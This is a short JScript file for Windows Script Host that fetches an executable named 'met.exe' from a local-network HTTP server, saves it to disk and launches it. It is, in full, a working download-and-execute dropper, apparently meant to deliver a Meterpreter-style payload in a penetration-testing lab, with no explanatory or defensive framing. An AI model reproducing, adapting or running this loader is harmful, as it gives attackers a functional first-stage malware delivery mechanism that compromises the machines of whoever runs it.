var url = "http://192.168.19.128:8000/met.exe";

var proxyServer = "";

// Match exact working pattern - use MSXML2.XMLHTTP not ServerXMLHTTP
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

// Only set proxy if provided
if (proxyServer && proxyServer.trim() !== "") {
    Object.setOption(2, proxyServer.trim());
}

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    // Match exact working Stream pattern
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("met.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("met.exe");
